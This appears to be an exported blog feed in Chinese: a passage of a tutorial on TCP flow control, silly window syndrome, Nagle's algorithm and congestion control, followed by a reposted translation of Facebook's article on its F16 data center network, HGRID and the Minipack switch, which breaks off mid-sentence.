客户端向服务端发送请求数据报文。这里要说明下，本次例子是把服务端作为发送方，所以没有画出服务端的接收窗口。 服务端收到请求报文后，发送确认报文和 80 字节的数据，于是可用窗口 Usable 减少为 120 字节，同时 SND.NXT 指针也向右偏移 80 字节后，指向 321，这意味着下次发送数据的时候，序列号是 321。 客户端收到 80 字节数据后，于是接收窗口往右移动 80 字节，RCV.NXT 也就指向 321，这意味着客户端期望的下一个报文的序列号是 321，接着发送确认报文给服务端。 服务端再次发送了 120 字节数据，于是可用窗口耗尽为 0，服务端无法在继续发送数据。 客户端收到 120 字节的数据后，于是接收窗口往右移动 120 字节，RCV.NXT 也就指向 441，接着发送确认报文给服务端。 服务端收到对 80 字节数据的确认报文后，SND.UNA 指针往右偏移后指向 321，于是可用窗口 Usable 增大到 80。 服务端收到对 120 字节数据的确认报文后，SND.UNA 指针往右偏移后指向 441，于是可用窗口 Usable 增大到 200。 服务端可以继续发送了，于是发送了 160 字节的数据后，SND.NXT 指向 601，于是可用窗口 Usable 减少到 40。 客户端收到 160 字节后，接收窗口往右移动了 160 字节，RCV.NXT 也就是指向了 601，接着发送确认报文给服务端。 服务端收到对 160 字节数据的确认报文后，发送窗口往右移动了 160 字节，于是 SND.UNA 指针偏移了 160 后指向 601，可用窗口 Usable 也就增大至了 200。 操作系统缓冲区与滑动窗口的关系前面的流量控制例子，我们假定了发送窗口和接收窗口是不变的，但是实际上，发送窗口和接收窗口中所存放的字节数，都是放在操作系统内存缓冲区中的，而操作系统的缓冲区，会被操作系统调整。 当应用进程没办法及时读取缓冲区的内容时，也会对我们的缓冲区造成影响。 那操心系统的缓冲区，是如何影响发送窗口和接收窗口的呢？ 我们先来看看第一个例子。 当应用程序没有及时读取缓存时，发送窗口和接收窗口的变化。 考虑以下场景： 客户端作为发送方，服务端作为接收方，发送窗口和接收窗口初始大小为 360； 服务端非常的繁忙，当收到客户端的数据时，应用层不能及时读取数据。 根据上图的流量控制，说明下每个过程： 客户端发送 140 字节数据后，可用窗口变为 220 （360 - 140）。 服务端收到 140 字节数据，但是服务端非常繁忙，应用进程只读取了 40 个字节，还有 100 字节占用着缓冲区，于是接收窗口收缩到了 260 （360 - 100），最后发送确认信息时，将窗口大小通过给客户端。 客户端收到确认和窗口通告报文后，发送窗口减少为 260。 客户端发送 180 字节数据，此时可用窗口减少到 80。 服务端收到 180 字节数据，但是应用程序没有读取任何数据，这 180 字节直接就留在了缓冲区，于是接收窗口收缩到了 80 （260 - 180），并在发送确认信息时，通过窗口大小给客户端。 客户端收到确认和窗口通告报文后，发送窗口减少为 80。 客户端发送 80 字节数据后，可用窗口耗尽。 服务端收到 80 字节数据，但是应用程序依然没有读取任何数据，这 80 字节留在了缓冲区，于是接收窗口收缩到了 0，并在发送确认信息时，通过窗口大小给客户端。 客户端收到确认和窗口通告报文后，发送窗口减少为 0。 可见最后窗口都收缩为 0 了，也就是发生了窗口关闭。当发送方可用窗口变为 0 时，发送方实际上会定时发送窗口探测报文，以便知道接收方的窗口是否发生了改变，这个内容后面会说，这里先简单提一下。 我们先来看看第二个例子。 当服务端系统资源非常紧张的时候，操心系统可能会直接减少了接收缓冲区大小，这时应用程序又无法及时读取缓存数据，那么这时候就有严重的事情发生了，会出现数据包丢失的现象。 说明下每个过程： 客户端发送 140 字节的数据，于是可用窗口减少到了 220。 服务端因为现在非常的繁忙，操作系统于是就把接收缓存减少了 100 字节，当收到 对 140 数据确认报文后，又因为应用程序没有读取任何数据，所以 140 字节留在了缓冲区中，于是接收窗口大小从 360 收缩成了 100，最后发送确认信息时，通告窗口大小给对方。 此时客户端因为还没有收到服务端的通告窗口报文，所以不知道此时接收窗口收缩成了 100，客户端只会看自己的可用窗口还有 220，所以客户端就发送了 180 字节数据，于是可用窗口减少到 40。 服务端收到了 180 字节数据时，发现数据大小超过了接收窗口的大小，于是就把数据包丢失了。 客户端收到第 2 步时，服务端发送的确认报文和通告窗口报文，尝试减少发送窗口到 100，把窗口的右端向左收缩了 80，此时可用窗口的大小就会出现诡异的负值。 所以，如果发生了先减少缓存，再收缩窗口，就会出现丢包的现象。 为了防止这种情况发生，TCP 规定是不允许同时减少缓存又收缩窗口的，而是采用先收缩窗口，过段时间在减少缓存，这样就可以避免了丢包情况。 窗口关闭在前面我们都看到了，TCP 通过让接收方指明希望从发送方接收的数据大小（窗口大小）来进行流量控制。 如果窗口大小为 0 时，就会阻止发送方给接收方传递数据，直到窗口变为非 0 为止，这就是窗口关闭。 窗口关闭潜在的危险 接收方向发送方通告窗口大小时，是通过 ACK 报文来通告的。 那么，当发生窗口关闭时，接收方处理完数据后，会向发送方通告一个窗口非 0 的 ACK 报文，如果这个通告窗口的 ACK 报文在网络中丢失了，那麻烦就大了。 这会导致发送方一直等待接收方的非 0 窗口通知，接收方也一直等待发送方的数据，如不不采取措施，这种相互等待的过程，会造成了死锁的现象。 TCP 是如何解决窗口关闭时，潜在的死锁现象呢？ 为了解决这个问题，TCP 为每个连接设有一个持续定时器，只要 TCP 连接一方收到对方的零窗口通知，就启动持续计时器。 如果持续计时器超时，就会发送窗口探测 ( Window probe ) 报文，而对方在确认这个探测报文时，给出自己现在的接收窗口大小。 如果接收窗口仍然为 0，那么收到这个报文的一方就会重新启动持续计时器； 如果接收窗口不是 0，那么死锁的局面就可以被打破了。 窗口探查探测的次数一般为 3 此次，每次次大约 30-60 秒（不同的实现可能会不一样）。如果 3 次过后接收窗口还是 0 的话，有的 TCP 实现就会发 RST 报文来中断连接。 糊涂窗口综合症如果接收方太忙了，来不及取走接收窗口里的数据，那么就会导致发送方的发送窗口越来越小。 到最后，如果接收方腾出几个字节并告诉发送方现在有几个字节的窗口，而发送方会义无反顾地发送这几个字节，这就是糊涂窗口综合症。 要知道，我们的 TCP + IP 头有 40 个字节，为了传输那几个字节的数据，要达上这么大的开销，这太不经济了。 就好像一个可以承载 50 人的大巴车，每次来了一两个人，就直接发车。除非家里有矿的大巴司机，才敢这样玩，不然迟早破产。要解决这个问题也不难，大巴司机等乘客数量超过了 25 个，才认定可以发车。 现举个糊涂窗口综合症的栗子，考虑以下场景： 接收方的窗口大小是 360 字节，但接收方由于某些原因陷入困境，假设接收方的应用层读取的能力如下： 接收方每接收 3 个字节，应用程序就只能从缓冲区中读取 1 个字节的数据； 在下一个发送方的 TCP 段到达之前，应用程序还从缓冲区中读取了 40 个额外的字节； 每个过程的窗口大小的变化，在图中都描述的很清楚了，可以发现窗口不断减少了，并且发送的数据都是比较小的了。 所以，糊涂窗口综合症的现象是可以发生在发送方和接收方： 接收方可以通告一个小的窗口 而发送方可以发送小数据 于是，要解决糊涂窗口综合症，就解决上面两个问题就可以了 让接收方不通告小窗口给发送方 让发送方避免发送小数据 怎么让接收方不通告小窗口呢？ 接收方通常的策略如下: 当「窗口大小」小于 min( MSS，缓存空间/2 ) ，也就是小于 MSS 与 1/2 缓存大小中的最小值时，就会向发送方通告窗口为 0，也就阻止了发送方再发数据过来。 等到接收方处理了一些数据后，窗口大小 &gt;= MSS，或者接收方缓存空间有一半可以使用，就可以把窗口打开让发送方发送数据过来。 怎么让发送方避免发送小数据呢？ 发送方通常的策略: 使用 Nagle 算法，该算法的思路是延时处理，它满足以下两个条件中的一条才可以发送数据： 要等到窗口大小 &gt;= MSS 或是 数据大小 &gt;= MSS 收到之前发送数据的 ack 回包 只要没满足上面条件中的一条，发送方一直在囤积数据，直到满足上面的发送条件。 另外，Nagle 算法默认是打开的，如果对于一些需要小数据包交互的场景的程序，比如，telnet 或 ssh 这样的交互性比较强的程序，则需要关闭 Nagle 算法。 可以在 Socket 设置 TCP_NODELAY 选项来关闭这个算法（关闭 Nagle 算法没有全局参数，需要根据每个应用自己的特点来关闭） 1setsockopt(sock_fd, IPPROTO_TCP, TCP_NODELAY, (char *)&amp;value, sizeof(int)); 拥塞控制 为什么要有拥塞控制呀，不是有流量控制了吗？ 前面的流量控制是避免「发送方」的数据填满「接收方」的缓存，但是并不知道网络的中发生了什么。 一般来说，计算机网络都处在一个共享的环境。因此也有可能会因为其他主机之间的通信使得网络拥堵。 在网络出现拥堵时，如果继续发送大量数据包，可能会导致数据包时延、丢失等，这时 TCP 就会重传数据，但是一重传就会导致网络的负担更重，于是会导致更大的延迟以及更多的丢包，这个情况就会进入恶性循环被不断地放大…. 所以，TCP 不能忽略网络上发生的事，它被设计成一个无私的协议，当网络发送拥塞时，TCP 会自我牺牲，降低发送的数据量。 于是，就有了拥塞控制，控制的目的就是避免「发送方」的数据填满整个网络。 为了在「发送方」调节所要发送数据的量，定义了一个叫做「拥塞窗口」的概念。 什么是拥塞窗口？和发送窗口有什么关系呢？ 拥塞窗口 cwnd是发送方维护的一个 的状态变量，它会根据网络的拥塞程度动态变化的。 我们在前面提到过发送窗口 swnd 和接收窗口 rwnd 是约等于的关系，那么由于入了拥塞窗口的概念后，此时发送窗口的值是swnd = min(cwnd, rwnd)，也就是拥塞窗口和接收窗口中的最小值。 拥塞窗口 cwnd 变化的规则： 只要网络中没有出现拥塞，cwnd 就会增大； 但网络中出现了拥塞，cwnd 就减少； 那么怎么知道当前网络是否出现了拥塞呢？ 其实只要「发送方」没有在规定时间内接收到 ACK 应答报文，也就是发生了超时重传，就会认为网络出现了用拥塞。 拥塞控制有哪些控制算法？ 拥塞控制主要是四个算法： 慢启动 拥塞避免 拥塞发生 快速恢复 慢启动TCP 在刚建立连接完成后，首先是有个慢启动的过程，这个慢启动的意思就是一点一点的提高发送数据包的数量，如果一上来就发大量的数据，这不是给网络添堵吗？ 慢启动的算法记住一个规则就行：当发送方每收到一个 ACK，就拥塞窗口 cwnd 的大小就会加 1。 这里假定拥塞窗口 cwnd 和发送窗口 swnd 相等，下面举个栗子： 连接建立完成后，一开始初始化 cwnd = 1，表示可以传一个 MSS 大小的数据。 当收到一个 ACK 确认应答后，cwnd 增加 1，于是一次能够发送 2 个 当收到 2 个的 ACK 确认应答后， cwnd 增加 2，于是就可以比之前多发2 个，所以这一次能够发送 4 个 当这 4 个的 ACK 确认到来的时候，每个确认 cwnd 增加 1， 4 个确认 cwnd 增加 4，于是就可以比之前多发 4 个，所以这一次能够发送 8 个。 可以看出慢启动算法，发包的个数是指数性的增长。 那慢启动涨到什么时候是个头呢？ 有一个叫慢启动门限 ssthresh （slow start threshold）状态变量。 当 cwnd &lt; ssthresh 时，使用慢启动算法。 当 cwnd &gt;= ssthresh 时，就会使用「拥塞避免算法」。 拥塞避免算法前面说道，当拥塞窗口 cwnd 「超过」慢启动门限 ssthresh 就会进入拥塞避免算法。 一般来说 ssthresh 的大小是 65535 字节。 那么进入拥塞避免算法后，它的规则是：每当收到一个 ACK 时，cwnd 增加 1/cwnd。 接上前面的慢启动的栗子，现假定 ssthresh 为 8： 当 8 个 ACK 应答确认到来时，每个确认增加 1/8，8 个 ACK 确认 cwnd 一共增加 1，于是这一次能够发送 9 个 MSS 大小的数据，变成了线性增长。 所以，我们可以发现，拥塞避免算法就是将原本慢启动算法的指数增长变成了线性增长，还是增长阶段，但是增长速度缓慢了一些。 就这么一直增长着后，网络就会慢慢进入了拥塞的状况了，于是就会出现丢包现象，这时就需要对丢失的数据包进行重传。 当触发了重传机制，也就进入了「拥塞发生算法」。 拥塞发生当网络出现拥塞，也就是会发生数据包重传，重传机制主要有两种： 超时重传 快速重传 这两种使用的拥塞发送算法是不同的，接下来分别来说说。 发生超时重传的拥塞发生算法 当发生了「超时重传」，则就会使用拥塞发生算法。 这个时候，sshresh 和 cwnd 的值会发生变化： ssthresh 设为 cwnd/2， cwnd 重置为 1 拥塞发送 —— 超时重传 接着，就重新开始慢启动，慢启动是会突然减少数据流的。这真是一旦「超时重传」，马上回到解放前。但是这种方式太激进了，反应也很强烈，会造成网络卡顿。 就好像本来在秋名山高速漂移着，突然来个紧急刹车，轮胎受得了吗。。。 发生快速重传的拥塞发生算法 还有更好的方式，前面我们讲过「快速重传算法」。当接收方发现丢了一个中间包的时候，发送三次前一个包的 ACK，于是发送端就会快速地重传，不必等待超时再重传。 TCP 认为这种情况不严重，因为大部分没丢，只丢了一小部分，则 ssthresh 和 cwnd 变化如下： cwnd = cwnd/2 ，也就是设置为原来的一半; ssthresh = cwnd; 进入快速恢复算法 快速恢复快速重传和快速恢复算法一般同时使用，快速恢复算法是认为，你还能收到 3 个重复 ACK 说明网络也不那么糟糕，所以没有必要像 RTO 超时那么强烈。 正如前面所说，进入快速恢复之前，cwnd 和 ssthresh 已被更新了： cwnd = cwnd/2 ，也就是设置为原来的一半; ssthresh = cwnd; 然后，进入快速恢复算法如下： 拥塞窗口 cwnd = ssthresh + 3 （ 3 的意思是确认有 3 个数据包被收到了） 重传丢失的数据包 如果再收到重复的 ACK，那么 cwnd 增加 1 如果收到新数据的 ACK 后，设置 cwnd 为 ssthresh，接着就进入了拥塞避免算法 也就是没有像「超时重传」一夜回到解放前，而是还在比较高的值，后续呈线性增长。 巨人的肩膀[1] 趣谈网络协议专栏.刘超.极客时间 [2] Web协议详解与抓包实战专栏.陶辉.极客时间 [3] TCP/IP详解 卷1：协议.范建华 译.机械工业出版社 [4] 图解TCP/IP.竹下隆史.人民邮电出版社 [5] The TCP/IP Guide.Charles M. Kozierok. [6] TCP那些事（上）.陈皓.酷壳博客.https://coolshell.cn/articles/11564.html [7] TCP那些事（下）.陈皓.酷壳博客.https://coolshell.cn/articles/11609.html","link":"/2020/07/02/图解TCP/"},{"title":"重新设计 Facebook 的数据中心网络","text":"转载自: https://arthurchiao.github.io/ 本文内容仅供学习交流，如有侵权立即删除。 译者序本文翻译自 Facebook 2019 年的一篇文章: Reinventing Facebook’s data center network。 文章介绍了 Facebook F4 架构之后的新一代 fabric 网络，基于 F16 架构（每个 POD 连接到 16 个 spine 平面）和 Minipack 交换机。 最初分享我们的数据中心 fabric 设计 时，我们在单个 APP 上支撑了 13.5 亿用户。随后几年，我们陆续公开分享了打造 自己的 交换机 、 开发 FBOSS（我们的网络操作系统）， 以及不断对网络各方面进行横向扩容（scale out）的历程。 最近，我们又宣布了去年设计的分布式网络系统 Fabric Aggregator。 时间回到今天。我们的数据中心 fabrics 现在支撑着 26 亿+ 用户，他们 使用着我们的视频服务、实时应用，以及快速膨胀的、极其消耗资源的内部服务。 我们的数据中心已经从少数几个 region 扩展到全世界的 15 个位置。 一方面是需求的不断增加，另一方面，我们又受限于电源物理特性的硬性限制（hard physical constraints of power）和光模块的供应和市场成熟度（optics supply availability）。 不断增长的需求和物理上面临的限制，这双重压力使我们开始重新思考如何对数据中心网 络进行自顶向下的改造（transform） —— 从拓扑（topologies）到基本组建模块（ building blocks）。 本文将分享我们在过去两年的变化： 网络方面，我们完成了下一代数据中心 fabric 的设计，名为 F16。 F16 相比 F4（前一代）有 4x 的容量。 F16 更易扩展，维护和演进也更简单，为未来几年所需的基础设施容量做好了准备。 F16 使用的是技术成熟、易于采购的 100G CWDM4-OCP 光模块 ，能提供与 400G 链路一样的 4x 容量，但使用的是成熟的 100G 光模块。 设计了一个全新的作为基本组建模块的交换机（building block switch），名为 Minipack。 Minipack 相比前一代设计，节省了 50% 的耗电量和物理空间。 Minipack 是模块化的，非常灵活，因此能在新的拓扑中承担多种角色，支撑网络在未来几年的持续演进。 除了 Minipack，我们还与 Arista Networks 合作开发了 7368X4 交换机。 Minipack 和 Arista 7368X4 都已经捐献给了 OCP，二者都运行 FBOSS。 开发了 Fabric Aggregator 的升级版 —— HGRID，以应对每个 region 内 building 翻倍带来的挑战。 FBOSS 仍然是将我们的数据中心连成整体的软件。但也做了很多重大改动，以确保只 需一份代码镜像和一套整体系统，就能支持多代数据中心拓扑和不断增长的硬件平台类型 ，尤其是新的模块化 Minipack 平台。 新数据中心拓扑：F16 和 HGRID回顾过去几年我们的数据中心拓扑，有如下需求相关的因素（demand-related factors）： 更高的单机柜带宽。 业务对机柜间带宽（inter-rack bandwidth）有更高的要求。 业务和网卡技术已经能轻松达到 1.6T 甚至更高的单机柜带宽。 更多的 region、更大的 region。 原来的数据中心规划中，单个 region 最多 3 个 building，互联网络（the interconnection network）也是为这个规模打造的。 但我们的计算需求增长太快，除了建造新 region，我们还将注意力放到了现有 region，看是否能将每个 region 的 building 数量翻倍（6 个）。 图 1. 上一代 fabric 设计中所面临的双带宽压力 硬性的、物理的限制方面，我们考虑的因素有： 电源 一个 region 内的功率是固定的。 我们的很多 region 都有专门设计的电力设施，提供 100MW 以上的容量。 将 building 数量翻倍，并不意味着我们能为这么多 building 提供足够的电力。 更高带宽的 ASIC 和光模块（例如，400G）耗电也更高。因此，网络在数据中 心总体电力预算中的的耗电量与网络设备在全部设备中的数量并不是成比例的。 光模块 我们的规模意味着，不论选择哪种光技术，它们都将大规模地应用于数据中心 —— 并 且推进时间会很快。 我们对 400G 光模块的大规模部署存有顾虑，尤其是在前沿技术的初期。 此外，过往的经验告诉我们，维护 Facebook 这种规模的数据中心意味着网络需要不断演进。我们会持续建造“绿色”数据中心（“green field” data centers），但每次迭代都 将使我们“新的”数据中心变成需要升级的数据中心。这些升级过程，是我们在将来的 设计中希望更多关注的东西。 备选方案我们考虑了几种实现更高带宽的方式。例如 复用原来的 fabric 设计。 利用我们现有的多芯片（multichip ）硬件，简单地向原来的网络添加更多的 fabric 平面。 这种方式的问题：现有的 fabric 交换机功耗将非常高。 Backpack 当前的设计需要 12 个 3.2Tb/s 的 ASIC 来提供 128x100G 端 口【译者注 1】，每个 POD 内总共有 48 个 ASIC【译者注 2】。 也可以选择在 Backpack 内使用非 CLOS 拓扑，但那样还是无法降低足够多功耗。 将 Backpack 内的链路带宽升级到 400G。 使用最先进的光模块意味着未来几年我们必须得用 800G 或 1600G 的光模块（才能 跟得上业务增长），这显然是不切实际的。 而且即便是当下，400G 光模块也没有达到我们这种规模下的要求。 【译者注 1】 根据 https://www.sdnlab.com/24039.html 的解释，每个 Backpack 的 12 个 ASIC 是这样分的： 4 个用于交换矩阵（spine）：提供 4 x 3.2T = 12.8T 带宽，对应文中的 “128x100G 端口” 8 个用于业务板卡 【译者注 2】 Backpack 是 4-post 设计，每个 POD 有 4 个 spine 平面，而每个平面 12 个 ASIC，因此每个 POD 是 4*12 = 48 个 ASIC。 F16：下一代 fabric 拓扑在评估了多种方案后，我们设计了一种新的数据中心 building 内部拓扑，命名为 “F16” 。Broadcom 的 Tomahawk 3 (TH3) ASIC 是 400G fabric 设计（4x-faster 400G fabric） 的可选方案之一，我们使用的就是这款 ASIC。但我们的使用方式不同： TH3：4 个 multichip-based 平面，400G 链路速度（radix-32 组建模块，每个芯片 32 口） F16：16 个 single-chip-based 平面，100G 链路速度（我们最优的 radix-128 模块，每个芯片 128 口） F16 的主要特点： 我们设计了一种名为 Minipack 的 128-port 100G fabric 交换机，作为 各基础设施层新的标准组建模块（uniform building block）。Minipack 是一种 灵活、单 ASIC 的设计，只用到 Backpack 一半的电力和空间。此外，单 芯片系统的管理和操作也更简单。 每个机柜连接到 16 个独立平面。Wedge 100S 作为 TOR 交换机，支持 1.6T 上行带宽和 1.6T 下行带宽。 每个平面由 16 个 128x100G fabric 交换机（Minipack）组成。 图 2. F16 数据中心网络拓扑 Broadcom TH3 芯片（ASIC）的两种使用方式： 32-port * 400G/port：端口数量少，端口速率高 128-port * 100G/port：端口数量多，端口速率低（相对 400G） 这两种方式都能满足我们 4x 容量的需求，提供单机柜 1.6T 的带宽。但选择了 100G（端 口数量多），我们就能少用 3x 的 fabric 芯片，将每个 POD 内 infra 交换机的数量从 48 个减少到 16： 图 3. 多芯片 400G POD fabric vs. 单芯片 F16 @100G 为实现 4x 容量目标，除了 减少子交换机数量 省电 之外，我们还利用了 技术成熟、经过验证、易于采购的 CWDM4-OCP 100G 光模块 我们现有的 Wedge 100S TORs。 这种方式还使得对现有 4 平面（4-plane） fabrics 进行升级更简单，为我们将来朝着 200G 和 400G 光模块升级铺平了道路。此外，这种设计能获得更高的电能使用效率（ power-usage profile，PUE【译者注 3】），比等待适用于大规模场景的 800G 和 1.6T 链 路更加现实，能快速地帮我们获得接下来所需的 2x 和 4x 性能提升。 【译者注 3】 PUE = 数据中心总能耗（Total Facility Power）/ IT 设备总能耗（IT Equipment Power）。 图 4. F16 架构中，服务器之间的跳数和排队点（hops and queuing points）减少了 2-3x 虽然拓扑看起来很大很复杂，但其实 F16 要比之前的 fabric 扁平和简单 2.25 倍（2.25 times flatter and simpler）。 如图 4 所示，考虑所有 intra-node 拓扑的话，原来的 fabric： 由 9 个独立的 ASIC 层组成（nine distinct ASIC tiers），从最底层的 TOR 到最上层 的 region 内 building 互联网络（Fabric Aggregator）。 在一个 fabric 内，机柜到机柜跳数，最好的情况下 6 跳，最差的情况下 12 跳。 但对于 small-radix（端口数比较少的）ASICs，大部分路径都是最差情况下的跳数 ，因为在一个大型、分布式系统中，命中同一个前面板芯片（the same front-panel chip）的概率是很低的。 从一个 building 内的机柜经过 Fabric Aggregator 到另一个 building 内的机柜需要 多达 24 跳。 而对于 F16， 同一 fabric 内服务器到服务器的路径总是最优路径【译者注 4】，只需 6 跳。 building 到 building 永远是 8 跳。 intra-fabric 跳数变为原来的 1/2。 inter-fabric 服务器间的跳数变为原来的 1/3。 【译者注 4】 单芯片交换机的设计，使得任何层级中的两个设备，总是会通过更上一层的设备直连，因 此跳数固定。 HGRID：下一代 fabric aggregation 解决方案去年，我们分享了 Fabric Aggregator， 这是一种解决 region 内 building 之间互联的分解式设计（disaggregated design）。 设计 Fabric Aggregator 的主要原因之一是：我们已经触及了对 region 内 3 个 building 的 fabric 网络做全连接（mesh）的单个大型设备的上限。 而未来计划将 region 内的 building 数量翻倍，那显然更是受这个限制的。 Fabric Aggregator 是一个完全分解式（completely disaggregated design）的设计，能 够扩展到多个机柜（scale across multiple racks），而我们当时使用的构建模块是 Wedge 100S。如今回头看，Fabric Aggregator 的落地，是我们后来的 HGRID 落地的基石 。 HGRID 是一个新的、更大的 building 之间的聚合层，能扩展到一个 region 内部的 6 个 building，每个 building 内都是一个 full F16 fabric。 HGRID 的设计原则和 Fabric Aggregator 相同，但现在的基本构建模块是 Minipack —— 支撑 F16 fabric 的新平台。 作为 F16 设计的一部分，我们将 fabric spine 交换机和 HGRID 直连，替换了原 来的 fabric edge PODs（边界 PODs），如图 5 所示： 这使得我们能进一步将 regional network 东西向流量扁平化（flatten the regional network for East-West traffic，即，同 region 内不同 building 之间的 流量路径变短，译者注），将每个 fabric 上行到 regional network 的带宽提升到 Pbps 级别。 边界 POD 在 fabric 方案的早期很发挥了重要作用，为过去的全连接聚合器（full-mesh aggregator） 提供了一种简单的 radix normalization（端口数量标准化）和 routing handoff（路由移交，即，所有进出 POD 的流量都送到这里，在这里进行路由判断，译者注）。 但新的分解式 FA 层（disaggregated FA tier）不再需要这些中间节点（interim hops），使我们能同时在带宽和规模上对 region 进行扩展（scale the regions in both bandwidth and size）。 图 5. 单 region 内 6 个 building 的数据中心，6 个 F16 fabrics 通过 HGRID 互联 新的、模块化的 128x100G 组建模块（building block）接下来，我们设计了组建模块交换机（building block switch），这也是所有这些新拓 扑的核心。 在设计拓扑以及新交换机时，减少耗电始终都是一个考虑因素，此外还需 要考虑灵活性和模块化。我们希望能用一种交换机同时承担数据中心中的多种角色 （fabric、spine、aggrgator），并且能在新的光模块面世时轻松地升级到更快的网络。 图 6. Minipack with PIM-16Q 随着 12.8T 交换机 ASIC 的进步，我们基于单颗 12.8T ASIC 设计了一个 128X100G 交 换机，名为 Minipack，如图 6 所示；而如果用之前的 Backpack 设计，就需要 12 颗芯 片组成 CLOS fabric。使用单颗 ASIC 相比于 Backpack 就已经节省了大量的耗电。 我们与 Edgecore 合作，基于我们的设计实现了 Minipack。 模块化（Modularity）虽然我们想要单芯片交换机，但也仍然需要类似 Backpack 这种盒式交换机（chassis switch）提供的模块化和灵活性。因此，Minipack 有为 128 口准备的接口模块（ interface modules），而不是一个固定的 “pizza box” 设计。这种设计既拥有单芯片的简 单性和省电特点，又有盒式交换机的灵活性/模块化。 我们尝试了不同的系统设计来实现这种模块化，最终选择了 8 个板卡模块（port interface module，PIM）正交直连的架构（orthogonal-direct architecture），如图 7 所示： 这种架构支持不同的粒度（the right granularity，即插几块卡），使 Minipack 能以多种角色高效地部署在 F16 网络中。 每块 PIM 卡在盒中都是垂直插的（vertically oriented），我们克服了机械方面的挑战 ，才将其端口（16x100G QSFP28）放到了前面板（front panel）。 我们还设计了一种用这些 PIM 进行光纤管理和路由（manage and route the fiber， 从下文看，是控制光纤/端口速度的意思，译者注）的方案。 每个 PIM 上都配备了名为 PIM-16Q 的 4x reverse gearbox（双向变速器）。 将变速器配置为 200G retimer 模式时，PIM-16Q 能支持 8x200G QSFP56 端口。剩 下的 8 个端口在这种模式下就没用了（nonfunctional）。 PIM-16Q 后向兼容 40G，能支持 16x40G QSFP+ 端口。 我们还设计了一个名为 PIM-4DD 的 400G PIM，能支持 4x400G QSFP-DD 端口。每个 PIM-4DD 都有 4x400G retimer 芯片。 在同一个 Minipack 机框内混合使用 PIM-16Q 和 PIM-4DD，就能获得 40G、100G、200G 和 400G 端口。 图 7. Minipack 盒式架构（chassis architecture） 这种 PIM 和端口之间的灵活性使 Minipack 能支持多代链路速度和数据中心拓扑，使 数据中心网络能平滑地从一代速度升级到下一代速度。 光模块（Optics）为用上技术成熟的 100G CWDM4-OCP 光模块，Minipack 使用了双向变速器（reverse gearboxes）。 Broadcom TH3 交换机芯片有 256 个 50G PAM4 SerDes 槽（lanes），支持 12.8T 交换带宽，而现有的 100G CWDM4 光模块只有 4 个 25G NRZ SerDes 槽。我们使 用变速器芯片来对接二者（bridge the gap）。 Minipack 中总共有 32 个变速器芯片(128x100G 配置)，每个负责处理 4x100G。 系统设计（System design）TH3 位于水平的交换机主板（switch main board，SMB）上，自带一个高效的散热片， 而变速器位于垂直的 PIM 上。 这种架构打开了通风道（the air channel），降低了对更高的热效率的系统依赖（ system impedance for better thermal efficiency）。我们能在降温风扇低速运行 的情况下，在 Minipack 中使用 100G CWDM4-Lite 光模块（55 摄氏度）。 SMB 和 PIM 直连减少了印刷电路板 trace 长度（printed circuit board trace lengths），也减少了信道插损（channel insertion loss）。 FRU-able PIM 使我们能有不同的接口选择，例如 PIM-16Q 和 PIM-4DD。 FRU-able SCM（switch control module，交换机控制模块）还提高了可服务性（ serviceability），例如在更换双列直插内存（dual in-line memory）模块或 SSD 的场景。 与 Facebook 的前一代交换机不同的是，Minipack 引入了数字光模块监控（digital optics monitoring，DOM）加速功能。 SMB 上有一块 input/output block (IOB) FPGA，通过 PCIe 连接到 CPU。 每个 PIM 上的 IOB FPGA 通过一个局部总线（local bus）与 DOM FPGA 通信。 DOM FPGA 通过低速 I2C 总线定期轮询光模块的 DOM 信息，而 CPU 只需通过高速 PCIe 读取这些信息，避免了直接通过低速 I2C 总线去访问。 MiniLake：Minipack 的控制器 图 8. MiniLack on Minipack SCM 对于 Minipack 的控制平面，我们自主设计了一个名为 MiniLake 的微控制器。MiniLack 基于非常适用于交换机应用的 COM Express 基本尺寸和 Type-7 针脚（basic form factor and Type-7 pinout）。 我们的一条指导性原则：像管理服务器一样管理交换机。MiniLake 提供了与 MonoLake 类似的管理接口，后者是我们管理服务器集群的一个多功能控制平台（ one-socket workhorse）。 我们已经将 Minipack+MiniLake 的完整设计贡献给 OCP，包括系统硬件规范、所有电气 设计文件、所有机械设计文件，以及编程图（programming images）。这些东西现在对 OCP 社区是完全开放的。 软件方面，我们在 Minipack 上运行 FBOSS，但社区已经将其他一些软件栈已经移植到 Minipack，包括来自 Cumulus Networks 的商用软件，以及来自 OCP Networking 项目的 SAI/SONIC 开源软件栈，因此其他公司如果要用的话，以上都是不错的备选。 与 Arista 联合开发 7368X4 交换机在设计了 F16 和 HGRID 拓扑，并设想用单芯片 128x100G 交换机作为组建模块之后，我们决定从两家源厂商制造这种交换机。 对于第二家厂商，我们选择了长期合作伙伴 Arista Networks，双方合作开发一款满足前面 所描述的高要求（power envelope、模块化、易管理等等）的交换机。 这对于我们双方来说都是一种新的伙伴关系。 在此之前，我们都是与 Edgecore、Celestica等这样的原始设计制造商（original design manufacturers，ODM）合作，这种模式中，所有的设计都源自 Facebook，ODM 厂商只负责生产。 而 Arista 过去已经独立设计了自己的交换机。 图 9. 100G 线卡的 Arista 7368X4 盒式交换机 这样，Facebook 与 Arista 联合设计了 Arista 7368X4 交换机，它具备 Minipack 的所 有优点， Minipack 所承担的角色，Arista 7368X4 都能够承担。 为使部署更加简单，我们内部做了一些约定，规定在具体某个数据中心中哪种角色应该用哪种交换机。 Arista 7368X4 既能运行 FBOSS 软件，也能运行 EOS。 这种联合开发模型给我们带来了几方面收益： 有了第二家提供商，底层的组件有了一定程度上的隔离性，在供应链上有了冗余性。 能并行地利用到 Arista 团队的工程开发能力，尤其是在主芯片（primary ASIC） 研发上（我们两个团队在并行研发），以及模块化 PIM 设计和外部 PHY 编程（虽然我 们使用了不同的变速器）。 有另一种交换机运行我们的网络操作系统，能帮我们快速判断某个问题是否与 FBOSS 或特定平台相关。 我们相信在这个交换机上运行 EOS 或开源软件的能力对网络管理和运维人员非常重要。 它给了团队使用开放交换机（open switch）的选项，同时允许在其上运行 EOS 这样的 商业软件 —— 如果他们想这么做的话。 最后，Arista 正在将他们的 Arista 7368X4 交换机规范贡献给 OCP。Arista 过去已经在 参与 OCP Networking 了，例如它们的其他交换机参与到 SAI/SONIC 项目，以及通过它们 近期收购的 Mojo Networks 公司进行的参与。 7368X4 规范贡献给社区这一举动代表了像 Arista 这样的业内老牌的 OEM 厂商的一个重大 的、逻辑上的方向：拥抱 OCP Networking 所项目倡导的开放式、分解式网络（open and disaggregated networking）。 底层运行的软件：FBOSS解决软件挑战前面已经介绍了 全新的拓扑 F16 和 HGRID 新的模块化的组建模块交换机（building block switches） Facebook 